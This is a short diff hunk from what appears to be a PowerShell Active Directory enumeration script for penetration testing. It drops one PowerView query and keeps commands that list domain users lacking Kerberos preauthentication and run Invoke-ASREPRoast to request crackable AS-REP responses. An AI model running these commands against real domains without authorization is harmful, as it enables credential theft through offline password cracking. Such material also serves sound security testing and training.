@@ -5429,7 +5429,6 @@ Congrats Newb!!! You have Imported the Quick and Dirty Powershell Enumeration Sc
 ###################
 # check for users who don't have kerberos preauthentication set
 Get-DomainUser -PreauthNotRequired
-Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 
 # To abuse users in the domain without kerberos preauthentication enabled and requests crackable AS-REP responses
 Invoke-ASREPRoast -Verbose | fl
